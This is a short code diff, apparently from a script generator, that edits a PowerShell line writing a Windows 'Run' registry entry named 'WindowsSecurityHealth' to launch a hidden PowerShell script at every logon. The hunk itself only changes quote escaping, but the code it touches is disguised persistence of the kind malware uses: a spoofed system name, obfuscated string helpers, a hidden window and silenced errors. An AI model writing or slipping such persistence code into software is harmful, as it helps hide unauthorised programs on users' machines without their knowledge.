@@ -5763,7 +5763,7 @@ try{
   if($src -and (Test-Path $src)){
     $rk=${xPs('Software\\Microsoft\\Windows\\CurrentVersion\\Run')}
     $rn=${xPs('WindowsSecurityHealth')}
-    Set-ItemProperty -Path "HKCU:\\$rk" -Name $rn -Value "powershell -nop -w hidden -File `"$src`"" -EA 0
+    Set-ItemProperty -Path "HKCU:\\$rk" -Name $rn -Value "powershell -nop -w hidden -File \`"$src\`"" -EA 0
   }
 }catch{}
 ` : '';
